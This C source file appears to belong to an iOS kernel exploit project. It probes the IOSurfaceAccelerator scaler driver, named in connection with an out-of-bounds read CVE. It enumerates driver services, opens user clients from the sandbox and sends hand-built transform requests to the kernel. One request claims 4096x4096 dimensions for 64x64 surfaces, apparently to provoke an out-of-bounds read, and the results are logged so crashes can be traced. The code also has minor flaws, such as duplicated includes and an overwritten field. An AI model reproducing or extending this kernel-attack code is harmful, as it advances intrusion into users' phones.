// language: C, file: scaler_probe.c, target: iOS 26.2 / 23C55 / arm64e
// First contact with the IOSurfaceAccelerator kernel client
// (AppleM2ScalerCSCDriver). CVE-2026-43655 (IOSurfaceAccelerator OOB read)
// is one of the live 26.3 advisories; the kext grew by 16 KB in 26.3.
// This probe only answers: is the service published, does it open from the
// sandbox, and which method classes does it accept. Every call is logged
// durably before it runs, so a panic still names the call.
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <CoreFoundation/CoreFoundation.h>
#include <unistd.h>
#include <dlfcn.h>
typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef);
extern uint32_t IOSurfaceGetID(IOSurfaceRef);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef);
extern kern_return_t IOSurfaceLock(IOSurfaceRef, uint32_t, uint32_t *);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef, uint32_t, uint32_t *);
#define IOS_LOCK_READONLY 1
#include "nk_trace.h"
#include "exploit.h"

#define sl(fmt, ...) do { nk_log(fmt, ##__VA_ARGS__); \
                          nk_doc_log("scaler.log", fmt, ##__VA_ARGS__); } while (0)

static const char *k_names[] = {
    "AppleM2ScalerCSCDriver",
    "AppleM2ScalerCSC",
    "IOSurfaceAccelerator",
    "IOSurfaceAcceleratorClient",
    "AppleM2ScalerCSCHal",
    "AppleM2ScalerCSCDriverUserClient",
};

static IOSurfaceRef mk_surf(uint32_t w, uint32_t h)
{
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    if (!d) return NULL;
    uint32_t v, fmt = 0x42475241, bpe = 4, bpr = w * 4;
    CFNumberRef n;
    v = w;
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &v);
    if (n) { CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), n); CFRelease(n); }
    v = h;
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &v);
    if (n) { CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), n); CFRelease(n); }
    v = bpe;
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &v);
    if (n) { CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), n); CFRelease(n); }
    v = bpr;
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &v);
    if (n) { CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerRow"), n); CFRelease(n); }
    v = fmt;
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &v);
    if (n) { CFDictionarySetValue(d, CFSTR("IOSurfacePixelFormat"), n); CFRelease(n); }
    IOSurfaceRef s = IOSurfaceCreate(d);
    CFRelease(d);
    return s;
}

static void fill_surf(IOSurfaceRef s, uint8_t v)
{
    IOSurfaceLock(s, 0, NULL);
    size_t n = IOSurfaceGetAllocSize(s);
    if (IOSurfaceGetBaseAddress(s)) memset(IOSurfaceGetBaseAddress(s), v, n);
    IOSurfaceUnlock(s, 0, NULL);
}

static uint64_t sum_surf(IOSurfaceRef s)
{
    IOSurfaceLock(s, IOS_LOCK_READONLY, NULL);
    const uint8_t *p = IOSurfaceGetBaseAddress(s);
    size_t n = IOSurfaceGetAllocSize(s);
    uint64_t sum = 0;
    if (p) for (size_t i = 0; i < n; i++) sum += p[i];
    IOSurfaceUnlock(s, IOS_LOCK_READONLY, NULL);
    return sum;
}

static void first_bytes(IOSurfaceRef s, char *out, size_t len)
{
    IOSurfaceLock(s, IOS_LOCK_READONLY, NULL);
    const uint8_t *p = IOSurfaceGetBaseAddress(s);
    int off = 0;
    if (p) for (size_t i = 0; i < 8 && i < len / 3; i++)
        off += snprintf(out + off, len - off, "%02x", p[i]);
    IOSurfaceUnlock(s, IOS_LOCK_READONLY, NULL);
}

static void put_f16(uint8_t *base, size_t off, double v) {
    int64_t q = (int64_t)(v * 65536.0);
    memcpy(base + off, &q, 8);
}

static void build_req(uint8_t *in, uint32_t sid, uint32_t did,
                      uint32_t sw, uint32_t sh, uint32_t dw, uint32_t dh)
{
    memset(in, 0, 432);
    *(uint32_t *)(in + 0) = did;
    *(uint32_t *)(in + 4) = sid;
    *(uint32_t *)(in + 72) = sw;
    *(uint32_t *)(in + 76) = sh;
    *(uint32_t *)(in + 112) = dw;
    *(uint32_t *)(in + 116) = dh;
    put_f16(in, 40, 0.0);
    put_f16(in, 48, 0.0);
    put_f16(in, 56, (double)sw);
    put_f16(in, 64, (double)sh);
    put_f16(in, 80, 0.0);
    put_f16(in, 88, 0.0);
    put_f16(in, 96, 0.0);
    put_f16(in, 104, 0.0);
    *(uint32_t *)(in + 104) = dw;
    *(uint32_t *)(in + 108) = dh;
    *(uint64_t *)(in + 32) = 0x2000;
}

static void probe_conn(io_connect_t c, const char *name, uint32_t type)
{
    static uint8_t in[432];
    char fb[64] = {0};
    kern_return_t kr;

    IOSurfaceRef src = mk_surf(64, 64);
    IOSurfaceRef dst = mk_surf(64, 64);
    if (!src || !dst) { sl("[SCALER] %s IOSurfaceCreate failed", name); return; }

    uint32_t sid = IOSurfaceGetID(src), did = IOSurfaceGetID(dst);
    sl("[SCALER] %s surf src=0x%x dst=0x%x", name, sid, did);

    fill_surf(src, 0x11);
    fill_surf(dst, 0x55);
    build_req(in, sid, did, 64, 64, 64, 64);
    kr = IOConnectCallStructMethod(c, 1, in, 432, NULL, NULL);
    sl("[SCALER] %s xform(flags2000) -> 0x%x", name, kr);
    usleep(300000);
    first_bytes(dst, fb, sizeof(fb));
    sl("[SCALER] %s dst1: sum=0x%llx first=%s", name,
       (unsigned long long)sum_surf(dst), fb);

    memset(in, 0, 24);
    *(uint64_t *)(in + 0) = 2;
    *(uint64_t *)(in + 8) = 50000;
    *(uint64_t *)(in + 16) = 500000;
    kr = IOConnectCallStructMethod(c, 10, in, 24, NULL, NULL);
    sl("[SCALER] %s prop24(2,50000,500000) -> 0x%x", name, kr);

    fill_surf(dst, 0x66);
    build_req(in, sid, did, 64, 64, 64, 64);
    kr = IOConnectCallStructMethod(c, 1, in, 432, NULL, NULL);
    sl("[SCALER] %s xform(flags2000,prop2) -> 0x%x", name, kr);
    usleep(300000);
    first_bytes(dst, fb, sizeof(fb));
    sl("[SCALER] %s dst2: sum=0x%llx first=%s", name,
       (unsigned long long)sum_surf(dst), fb);

    {
        void *fw = dlopen("/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator", RTLD_NOW);
        if (fw) {
            int (*cr)(CFAllocatorRef, CFDictionaryRef, void **) = (void *)dlsym(fw, "IOSurfaceAcceleratorCreate");
            int (*tf)(void *, IOSurfaceRef, IOSurfaceRef, CFDictionaryRef) = (void *)dlsym(fw, "IOSurfaceAcceleratorTransformSurface");
            if (cr && tf) {
                void *acc = NULL;
                int rc = cr(NULL, NULL, &acc);
                sl("[SCALER] %s dlopen create -> 0x%x acc=%p", name, rc, acc);
                if (acc) {
                    fill_surf(dst, 0x44);
                    rc = tf(acc, src, dst, NULL);
                    usleep(300000);
                    first_bytes(dst, fb, sizeof(fb));
                    sl("[SCALER] %s fw xform -> 0x%x sum=0x%llx first=%s", name, rc,
                       (unsigned long long)sum_surf(dst), fb);
                }
            } else sl("[SCALER] %s dlsym miss", name);
        } else sl("[SCALER] %s dlopen failed", name);
    }

    fill_surf(dst, 0x77);
    build_req(in, sid, did, 4096, 4096, 4096, 4096);
    kr = IOConnectCallStructMethod(c, 1, in, 432, NULL, NULL);
    sl("[SCALER] %s xform(lie4096,prop2) -> 0x%x", name, kr);
    usleep(300000);
    first_bytes(dst, fb, sizeof(fb));
    sl("[SCALER] %s dst3: sum=0x%llx first=%s", name,
       (unsigned long long)sum_surf(dst), fb);

    CFRelease(src);
    CFRelease(dst);
}

void nk_scaler_probe(void)
{
    nk_doc_log_open("scaler.log");
    sl("[SCALER] === IOSurfaceAccelerator first contact ===");

    for (uint32_t i = 0; i < sizeof(k_names) / sizeof(k_names[0]); i++) {
        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching(k_names[i]));
        if (!svc) {
            sl("[SCALER] no service %s", k_names[i]);
            continue;
        }
        sl("[SCALER] service %s io=0x%x", k_names[i], svc);

        CFMutableDictionaryRef props = NULL;
        if (IORegistryEntryCreateCFProperties(svc, &props, kCFAllocatorDefault, 0) == KERN_SUCCESS && props) {
            sl("[SCALER] %s props=%ld", k_names[i], (long)CFDictionaryGetCount(props));
            CFStringRef ucc = CFDictionaryGetValue(props, CFSTR("IOUserClientClass"));
            if (ucc && CFGetTypeID(ucc) == CFStringGetTypeID()) {
                char buf[128] = {0};
                CFStringGetCString(ucc, buf, sizeof(buf), kCFStringEncodingUTF8);
                sl("[SCALER] %s IOUserClientClass=%s", k_names[i], buf);
            }
            CFRelease(props);
        }

        for (uint32_t t = 0; t <= 8; t++) {
            io_connect_t c = MACH_PORT_NULL;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), t, &c);
            sl("[SCALER] open %s type=%u -> 0x%x conn=0x%x",
               k_names[i], t, kr, c);
            if (kr == KERN_SUCCESS && c) {
                probe_conn(c, k_names[i], t);
                IOServiceClose(c);
                break;
            }
        }
        IOObjectRelease(svc);
    }
    sl("[SCALER] done");
}
